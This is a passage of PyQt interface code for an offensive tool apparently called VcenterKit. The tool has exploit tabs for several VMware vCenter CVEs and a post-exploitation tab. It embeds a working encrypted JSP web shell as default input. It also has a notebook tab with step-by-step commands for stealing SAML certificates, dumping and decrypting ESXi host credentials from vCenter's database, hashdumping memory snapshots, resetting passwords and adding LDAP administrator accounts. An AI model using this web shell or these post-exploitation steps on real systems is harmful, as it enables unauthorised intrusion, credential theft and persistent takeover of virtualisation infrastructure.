        self.cve_2021_22005_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.cve_2021_22005_result_text.setStyleSheet("background-color: #ffffff;\n"
"font: 12pt \"Courier New\";\n"
"color: #006600;")
        self.cve_2021_22005_result_text.setMarkdown("")
        self.cve_2021_22005_result_text.setOverwriteMode(False)
        self.cve_2021_22005_result_text.setPlaceholderText("")
        self.cve_2021_22005_result_text.setObjectName("cve_2021_22005_result_text")
        self.cve_2021_22005_target_groupbox = QtWidgets.QGroupBox(self.cve_2021_22005)
        self.cve_2021_22005_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 201))
        self.cve_2021_22005_target_groupbox.setObjectName("cve_2021_22005_target_groupbox")
        self.cve_2021_22005_target_url_label = QtWidgets.QLabel(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_url_label.setGeometry(QtCore.QRect(10, 10, 81, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_22005_target_url_label.setFont(font)
        self.cve_2021_22005_target_url_label.setObjectName("cve_2021_22005_target_url_label")
        self.cve_2021_22005_target_url_text = QtWidgets.QLineEdit(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_url_text.setGeometry(QtCore.QRect(90, 10, 821, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_22005_target_url_text.setFont(font)
        self.cve_2021_22005_target_url_text.setObjectName("cve_2021_22005_target_url_text")
        self.cve_2021_22005_target_shell_label = QtWidgets.QLabel(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_shell_label.setGeometry(QtCore.QRect(50, 90, 31, 21))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_22005_target_shell_label.setFont(font)
        self.cve_2021_22005_target_shell_label.setObjectName("cve_2021_22005_target_shell_label")
        self.cve_2021_22205_target_shell_text = QtWidgets.QTextEdit(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22205_target_shell_text.setGeometry(QtCore.QRect(90, 50, 821, 101))
        self.cve_2021_22205_target_shell_text.setPlaceholderText("")
        self.cve_2021_22205_target_shell_text.setObjectName("cve_2021_22205_target_shell_text")
        self.cve_2021_22005_target_check = QtWidgets.QPushButton(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_check.setGeometry(QtCore.QRect(960, 10, 181, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_22005_target_check.setFont(font)
        self.cve_2021_22005_target_check.setObjectName("cve_2021_22005_target_check")
        self.cve_2021_22005_target_exploit = QtWidgets.QPushButton(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_exploit.setGeometry(QtCore.QRect(960, 50, 181, 141))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2021_22005_target_exploit.setFont(font)
        self.cve_2021_22005_target_exploit.setObjectName("cve_2021_22005_target_exploit")
        self.cve_2021_22005_target_shell_name_label = QtWidgets.QLabel(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_shell_name_label.setGeometry(QtCore.QRect(10, 160, 71, 31))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2021_22005_target_shell_name_label.setFont(font)
        self.cve_2021_22005_target_shell_name_label.setObjectName("cve_2021_22005_target_shell_name_label")
        self.cve_2021_22005_target_shell_name_text = QtWidgets.QLineEdit(self.cve_2021_22005_target_groupbox)
        self.cve_2021_22005_target_shell_name_text.setGeometry(QtCore.QRect(90, 160, 821, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2021_22005_target_shell_name_text.setFont(font)
        self.cve_2021_22005_target_shell_name_text.setObjectName("cve_2021_22005_target_shell_name_text")
        self.tabWidget.addTab(self.cve_2021_22005, icon2, "")
        self.cve_2022_22954 = QtWidgets.QWidget()
        self.cve_2022_22954.setObjectName("cve_2022_22954")
        self.cve_2022_22954_result_groupbox = QtWidgets.QGroupBox(self.cve_2022_22954)
        self.cve_2022_22954_result_groupbox.setGeometry(QtCore.QRect(10, 220, 1171, 441))
        self.cve_2022_22954_result_groupbox.setObjectName("cve_2022_22954_result_groupbox")
        self.cve_2022_22954_result_text = QtWidgets.QTextBrowser(self.cve_2022_22954_result_groupbox)
        self.cve_2022_22954_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 411))
        self.cve_2022_22954_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.cve_2022_22954_result_text.setStyleSheet("background-color: #ffffff;\n"
"font: 12pt \"Courier New\";\n"
"color: #006600;")
        self.cve_2022_22954_result_text.setMarkdown("")
        self.cve_2022_22954_result_text.setOverwriteMode(False)
        self.cve_2022_22954_result_text.setPlaceholderText("")
        self.cve_2022_22954_result_text.setObjectName("cve_2022_22954_result_text")
        self.cve_2022_22954_target_groupbox = QtWidgets.QGroupBox(self.cve_2022_22954)
        self.cve_2022_22954_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 211))
        self.cve_2022_22954_target_groupbox.setObjectName("cve_2022_22954_target_groupbox")
        self.cve_2022_22954_target_url_label = QtWidgets.QLabel(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_url_label.setGeometry(QtCore.QRect(30, 10, 81, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2022_22954_target_url_label.setFont(font)
        self.cve_2022_22954_target_url_label.setObjectName("cve_2022_22954_target_url_label")
        self.cve_2022_22954_target_url_text = QtWidgets.QLineEdit(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_url_text.setGeometry(QtCore.QRect(110, 10, 401, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2022_22954_target_url_text.setFont(font)
        self.cve_2022_22954_target_url_text.setObjectName("cve_2022_22954_target_url_text")
        self.cve_2022_22954_target_command_label = QtWidgets.QLabel(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_command_label.setGeometry(QtCore.QRect(520, 10, 61, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2022_22954_target_command_label.setFont(font)
        self.cve_2022_22954_target_command_label.setObjectName("cve_2022_22954_target_command_label")
        self.cve_2022_22954_target_command_text = QtWidgets.QTextEdit(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_command_text.setGeometry(QtCore.QRect(580, 10, 361, 31))
        font = QtGui.QFont()
        font.setPointSize(12)
        self.cve_2022_22954_target_command_text.setFont(font)
        self.cve_2022_22954_target_command_text.setPlaceholderText("")
        self.cve_2022_22954_target_command_text.setObjectName("cve_2022_22954_target_command_text")
        self.cve_2022_22954_target_check_button = QtWidgets.QPushButton(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_check_button.setGeometry(QtCore.QRect(970, 10, 181, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2022_22954_target_check_button.setFont(font)
        self.cve_2022_22954_target_check_button.setObjectName("cve_2022_22954_target_check_button")
        self.cve_2022_22954_exploit_button = QtWidgets.QPushButton(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_exploit_button.setGeometry(QtCore.QRect(970, 60, 181, 141))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2022_22954_exploit_button.setFont(font)
        self.cve_2022_22954_exploit_button.setObjectName("cve_2022_22954_exploit_button")
        self.cve_2022_22954_target_shell_label = QtWidgets.QLabel(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_shell_label.setGeometry(QtCore.QRect(70, 100, 31, 21))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2022_22954_target_shell_label.setFont(font)
        self.cve_2022_22954_target_shell_label.setObjectName("cve_2022_22954_target_shell_label")
        self.cve_2022_22954_target_shell_name_text = QtWidgets.QLineEdit(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_shell_name_text.setGeometry(QtCore.QRect(110, 170, 831, 31))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.cve_2022_22954_target_shell_name_text.setFont(font)
        self.cve_2022_22954_target_shell_name_text.setObjectName("cve_2022_22954_target_shell_name_text")
        self.cve_2022_22954_target_shell_text = QtWidgets.QTextEdit(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_shell_text.setGeometry(QtCore.QRect(110, 60, 831, 101))
        self.cve_2022_22954_target_shell_text.setPlaceholderText("")
        self.cve_2022_22954_target_shell_text.setObjectName("cve_2022_22954_target_shell_text")
        self.cve_2022_22954_target_shell_name_label = QtWidgets.QLabel(self.cve_2022_22954_target_groupbox)
        self.cve_2022_22954_target_shell_name_label.setGeometry(QtCore.QRect(30, 170, 71, 31))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(10)
        self.cve_2022_22954_target_shell_name_label.setFont(font)
        self.cve_2022_22954_target_shell_name_label.setObjectName("cve_2022_22954_target_shell_name_label")
        self.tabWidget.addTab(self.cve_2022_22954, icon2, "")
        self.cve_2022_22972 = QtWidgets.QWidget()
        self.cve_2022_22972.setObjectName("cve_2022_22972")
        self.cve_2022_22972_result_groupbox = QtWidgets.QGroupBox(self.cve_2022_22972)
        self.cve_2022_22972_result_groupbox.setGeometry(QtCore.QRect(10, 100, 1171, 561))
        self.cve_2022_22972_result_groupbox.setObjectName("cve_2022_22972_result_groupbox")
        self.cve_2022_22972_result_text = QtWidgets.QTextBrowser(self.cve_2022_22972_result_groupbox)
        self.cve_2022_22972_result_text.setGeometry(QtCore.QRect(10, 20, 1151, 531))
        self.cve_2022_22972_result_text.viewport().setProperty("cursor", QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.cve_2022_22972_result_text.setStyleSheet("background-color: #ffffff;\n"
"font: 12pt \"Courier New\";\n"
"color: #006600;")
        self.cve_2022_22972_result_text.setMarkdown("")
        self.cve_2022_22972_result_text.setOverwriteMode(False)
        self.cve_2022_22972_result_text.setPlaceholderText("")
        self.cve_2022_22972_result_text.setObjectName("cve_2022_22972_result_text")
        self.cve_2022_22972_target_groupbox = QtWidgets.QGroupBox(self.cve_2022_22972)
        self.cve_2022_22972_target_groupbox.setGeometry(QtCore.QRect(10, 10, 1171, 81))
        self.cve_2022_22972_target_groupbox.setObjectName("cve_2022_22972_target_groupbox")
        self.cve_2022_22972_target_url_label = QtWidgets.QLabel(self.cve_2022_22972_target_groupbox)
        self.cve_2022_22972_target_url_label.setGeometry(QtCore.QRect(20, 20, 91, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2022_22972_target_url_label.setFont(font)
        self.cve_2022_22972_target_url_label.setObjectName("cve_2022_22972_target_url_label")
        self.cve_2022_22972_target_url_text = QtWidgets.QLineEdit(self.cve_2022_22972_target_groupbox)
        self.cve_2022_22972_target_url_text.setGeometry(QtCore.QRect(120, 20, 801, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2022_22972_target_url_text.setFont(font)
        self.cve_2022_22972_target_url_text.setObjectName("cve_2022_22972_target_url_text")
        self.cve_2022_22972_get_cookie_button = QtWidgets.QPushButton(self.cve_2022_22972_target_groupbox)
        self.cve_2022_22972_get_cookie_button.setGeometry(QtCore.QRect(930, 20, 221, 41))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.cve_2022_22972_get_cookie_button.setFont(font)
        self.cve_2022_22972_get_cookie_button.setObjectName("cve_2022_22972_get_cookie_button")
        self.tabWidget.addTab(self.cve_2022_22972, icon2, "")
        self.post_exploitation_utilizaiton_groupbox = QtWidgets.QWidget()
        self.post_exploitation_utilizaiton_groupbox.setObjectName("post_exploitation_utilizaiton_groupbox")
        self.py_script_generate_groupbox = QtWidgets.QGroupBox(self.post_exploitation_utilizaiton_groupbox)
        self.py_script_generate_groupbox.setGeometry(QtCore.QRect(10, 10, 441, 641))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.py_script_generate_groupbox.setFont(font)
        self.py_script_generate_groupbox.setObjectName("py_script_generate_groupbox")
        self.vhost_password_decrypt_button = QtWidgets.QPushButton(self.py_script_generate_groupbox)
        self.vhost_password_decrypt_button.setGeometry(QtCore.QRect(10, 30, 411, 71))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.vhost_password_decrypt_button.setFont(font)
        self.vhost_password_decrypt_button.setObjectName("vhost_password_decrypt_button")
        self.vcenter_saml_login_button = QtWidgets.QPushButton(self.py_script_generate_groupbox)
        self.vcenter_saml_login_button.setGeometry(QtCore.QRect(10, 120, 411, 71))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.vcenter_saml_login_button.setFont(font)
        self.vcenter_saml_login_button.setObjectName("vcenter_saml_login_button")
        self.vcenter_saml_login_target_button = QtWidgets.QPushButton(self.py_script_generate_groupbox)
        self.vcenter_saml_login_target_button.setGeometry(QtCore.QRect(10, 210, 411, 71))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.vcenter_saml_login_target_button.setFont(font)
        self.vcenter_saml_login_target_button.setObjectName("vcenter_saml_login_target_button")
        self.vcenter_ldap_manage_button = QtWidgets.QPushButton(self.py_script_generate_groupbox)
        self.vcenter_ldap_manage_button.setGeometry(QtCore.QRect(10, 300, 411, 71))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.vcenter_ldap_manage_button.setFont(font)
        self.vcenter_ldap_manage_button.setObjectName("vcenter_ldap_manage_button")
        self.py_script_generate_result_groupbox = QtWidgets.QGroupBox(self.post_exploitation_utilizaiton_groupbox)
        self.py_script_generate_result_groupbox.setGeometry(QtCore.QRect(470, 10, 721, 641))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.py_script_generate_result_groupbox.setFont(font)
        self.py_script_generate_result_groupbox.setObjectName("py_script_generate_result_groupbox")
        self.py_script_generate_result_text = QtWidgets.QTextBrowser(self.py_script_generate_result_groupbox)
        self.py_script_generate_result_text.setGeometry(QtCore.QRect(10, 20, 701, 611))
        self.py_script_generate_result_text.setObjectName("py_script_generate_result_text")
        self.tabWidget.addTab(self.post_exploitation_utilizaiton_groupbox, "")
        self.pentest_notebook_groupbox = QtWidgets.QWidget()
        self.pentest_notebook_groupbox.setObjectName("pentest_notebook_groupbox")
        self.notebook_text = QtWidgets.QTextEdit(self.pentest_notebook_groupbox)
        self.notebook_text.setGeometry(QtCore.QRect(10, 10, 1171, 641))
        self.notebook_text.setObjectName("notebook_text")
        self.notebook_text.setMarkdown("""# 1.  SAML cert login\n```\n# default mdb spath\nlinux: /storage/db/vmware-vmdir/data.mdb\nwindows: C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb\n# use python script to generate the cookie\n# on your attack computer\npython3 vcenter_saml_login.py -p data.mdb -t 192.168.0.92\n# On the victim's host\npython vCenter_ExtraCertFromMdb.py data.mdb\npython vCenter_GenerateLoginCookie.py 192.168.1.1 192.168.1.1 test.com idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt\n```\n# 2. Get the username and password of the vpxusers\n## 2.1 get the configuration of postgresql\n```\n# linux\ncat /etc/vmware-vpx/vcdb.properties\n# or\ncat /etc/vmware/service-state/vpxd/vcdb.properties\n# windows\ntype  C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vps\\vcdb.properties\n```\n## 2.2 connect to postgresql\n```\n# linux\n/opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc\n# windows\n"C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe" -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc\n```\n## 2.3 Get <symkey.dat>\n```\n# linux\ncat /etc/vmware-vpx/ssl/symkey.dat\n# windows\ntype "C:\\ProgramData\\VMware\\vCenter Server\\cfg\\vmware-vpx\\ssl\\symkey.dat"\n```\n## 2.4 decrypt\n```\npython3 vhost_password_decrypt.py symkey.dat password.enc password.txt\n```\n# 3. Get Windows machine privileges in Vcenter backend\n## 3.1 tools download\nAll: \n> https://www.volatilityfoundation.org/releases\n\nExample:\n> http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.zip\n## 3.2 Commonly used commands\n```\n# view the suggested profiles\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem imageinfo\n# List the registry content\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem --profile=Win7SP1x64 hivelist\n# Use hashdump to get hash values\nvolatility_2.6_win64_standalone.exe -f server2008R2-Snapshot2.vmem --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000478010\n```\n# 4. Reset the password\n```\n# select 3!!!\n# Linux\n/usr/lib/vmware-vmdir/bin/vdcadmintool\n# Windows\n"C:\\Program Files\\VMware\\vCenter Server\\vmdird\\vdcadmintool.exe"\n```\n# 5. Add a user to LDAP\n```\npython vCenterLDAP_Manage.py adduser\npython vCenterLDAP_Manage.py addadmin\n```\n# 6. Reference article\n```\nhttps://daidaitiehanhan.github.io/2022/04/18/vCenter2021%e5%87%a0%e4%b8%aa%e6%bc%8f%e6%b4%9e%e5%8f%8a%e5%90%8e%e6%b8%97%e9%80%8f/\n\nhttps://www.wangan.com/p/11v6c7ccd944ff8e\n\nhttps://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%974-PostgreSQL\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%975-LDAP\n\nhttps://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates\n\nhttps://github.com/worawit/CVE-2021-3156/blob/main/exploit_defaults_mailer.py\n\nhttps://blog.csdn.net/csdnmmd/article/details/127878832\n\nhttps://www.cnblogs.com/haidragon/p/16843418.html\n\nhttps://mp.weixin.qq.com/s/-cEf0bG8j_8VdoSEeMsNGw\n\nhttps://mp.weixin.qq.com/s/Okxc4CdFRPe82UHN4UXQHQ\n\nhttps://mp.weixin.qq.com/s/JI3YlyComDViFX31UE8ddA\n\nhttps://mp.weixin.qq.com/s/DbXxm6vWgtL8uGjO_z-ocA\n\nhttps://pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/\n```\n""")
        self.tabWidget.addTab(self.pentest_notebook_groupbox, "")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1200, 23))
        self.menubar.setObjectName("menubar")
        self.menuProxy = QtWidgets.QMenu(self.menubar)
        self.menuProxy.setObjectName("menuProxy")
        self.menuAbout = QtWidgets.QMenu(self.menubar)
        self.menuAbout.setObjectName("menuAbout")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionAdd_Proxy_For_Vcenterit = QtWidgets.QAction(MainWindow)
        self.actionAdd_Proxy_For_Vcenterit.setObjectName("actionAdd_Proxy_For_Vcenterit")
        self.actionAbout_the_author = QtWidgets.QAction(MainWindow)
        self.actionAbout_the_author.setObjectName("actionAbout_the_author")
        self.actionhelp = QtWidgets.QAction(MainWindow)
        self.actionhelp.setObjectName("actionhelp")
        self.menuProxy.addAction(self.actionAdd_Proxy_For_Vcenterit)
        self.menuAbout.addAction(self.actionAbout_the_author)
        self.menuAbout.addAction(self.actionhelp)
        self.menubar.addAction(self.menuProxy.menuAction())
        self.menubar.addAction(self.menuAbout.menuAction())

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(0)
        self.info_collect_button.clicked.connect(self.ClickCollectVcenterInfoButton)
        self.cve_2021_21972_target_check.clicked.connect(self.Click_CVE_2021_21972_check_Button)
        self.cve_2021_21972_target_exploit.clicked.connect(self.Click_CVE_2021_21972_exploit_Button)
        self.cve_2021_21985_target_check_button.clicked.connect(self.Click_CVE_2021_21985_check_Button)
        self.cve_2021_21985_exploit_button.clicked.connect(self.Click_CVE_2021_21985_exploit_Button)
        self.cve_2021_22005_target_check.clicked.connect(self.Click_CVE_2021_22005_check_Button)
        self.cve_2021_22005_target_exploit.clicked.connect(self.Click_CVE_2021_22005_exploit_Button)
        self.cve_2022_22954_target_check_button.clicked.connect(self.Click_CVE_2022_22954_check_Button)
        self.cve_2022_22954_exploit_button.clicked.connect(self.Click_CVE_2022_22954_exploit_Button)
        self.cve_2022_22972_get_cookie_button.clicked.connect(self.Click_CVE_2022_22972_exploit_Button)
        self.vhost_password_decrypt_button.clicked.connect(self.click_generate_vpd)
        self.vcenter_saml_login_button.clicked.connect(self.click_generate_vsl)
        self.vcenter_saml_login_target_button.clicked.connect(self.click_generate_vefm_and_vlc)
        self.vcenter_ldap_manage_button.clicked.connect(self.click_generate_vlm)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "VcenterKit v0.0.1    Author: W01fh4cker   Blog: https://w01fh4cker.github.io"))
        self.tabWidget.setToolTip(_translate("MainWindow", "<html><head/><body><p><br/></p></body></html>"))
        self.collect_info_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.info_collect_url_label.setText(_translate("MainWindow", "Target Url:    "))
        self.info_collect_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.info_collect_button.setText(_translate("MainWindow", "Collect its info!"))
        self.collect_info_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.info_collect_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.info_collect), _translate("MainWindow", "Collect Info"))
        self.cve_2021_21972_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.cve_2021_21972_target_url_label.setText(_translate("MainWindow", "Target Url:    "))
        self.cve_2021_21972_target_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.cve_2021_21972_target_shell_label.setText(_translate("MainWindow", "Shell:"))
        self.cve_2021_21972_target_shell_text.setMarkdown(_translate("MainWindow", "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U\n"
"extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return\n"
"super.defineClass(b,0,b.length);}}%><%if\n"
"(request.getMethod().equals(\"POST\")){String k=\n"
"\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher\n"
"c=Cipher.getInstance(\"AES\");c.init( 2,new\n"
"SecretKeySpec(k.getBytes(),\"AES\"));new\n"
"U(this.getClass().getClassLoader()).g(c.doFinal(new\n"
"sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta\n"
"ce().equals(pageContext);}%>\n"
"\n"
""))
        self.cve_2021_21972_target_shell_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:6px; margin-bottom:6px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">&lt;%@page import=&quot;java.util.</span><span style=\" font-size:10pt; font-style:italic;\">,javax.crypto.</span><span style=\" font-size:10pt;\">,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k= &quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init( 2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta ce().equals(pageContext);}%&gt;</span></p></body></html>"))
        self.cve_2021_21972_target_check.setText(_translate("MainWindow", "1. check"))
        self.cve_2021_21972_target_exploit.setText(_translate("MainWindow", "2. exploit"))
        self.cve_2021_21972_target_shell_name_label.setText(_translate("MainWindow", "Shell Name:"))
        self.cve_2021_21972_target_shell_name_text.setPlaceholderText(_translate("MainWindow", " Example: shell.jsp"))
        self.cve_2021_21972_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.cve_2021_21972_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.cve_2021_21972), _translate("MainWindow", "CVE-2021-21972"))
        self.cve_2021_21985_result_groupbox.setTitle(_translate("MainWindow", "Result"))
        self.cve_2021_21985_result_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'Courier New\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.cve_2021_21985_target_groupbox.setTitle(_translate("MainWindow", "Target"))
        self.cve_2021_21985_target_url_label.setText(_translate("MainWindow", "Target Url:"))
        self.cve_2021_21985_target_url_text.setPlaceholderText(_translate("MainWindow", " Example: https://vcenter.example.com"))
        self.cve_2021_21985_target_command_label.setText(_translate("MainWindow", "Command:"))
        self.cve_2021_21985_target_command_text.setMarkdown(_translate("MainWindow", "whoami\n"
"\n"
""))
        self.cve_2021_21985_target_command_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:12pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:8px; margin-bottom:8px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">whoami</p></body></html>"))
        self.cve_2021_21985_target_check_button.setText(_translate("MainWindow", "1. check"))
        self.cve_2021_21985_exploit_button.setText(_translate("MainWindow", "2. exploit"))
        self.cve_2021_21985_target_rmi_label.setText(_translate("MainWindow", "RMI(optional):"))
        self.cve_2021_21985_target_rmi_text.setPlaceholderText(_translate("MainWindow", " Example: rmi://8.8.8.8:1099/Exploit"))
        self.cve_2021_21985_target_shell_label.setText(_translate("MainWindow", "Shell:"))
        self.cve_2021_21985_target_shell_text.setMarkdown(_translate("MainWindow", "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U\n"
"extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return\n"
"super.defineClass(b,0,b.length);}}%><%if\n"
"(request.getMethod().equals(\"POST\")){String k=\n"
"\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher\n"
"c=Cipher.getInstance(\"AES\");c.init( 2,new\n"
"SecretKeySpec(k.getBytes(),\"AES\"));new\n"
"U(this.getClass().getClassLoader()).g(c.doFinal(new\n"
"sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta\n"
"ce().equals(pageContext);}%>\n"
"\n"
""))
        self.cve_2021_21985_target_shell_text.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
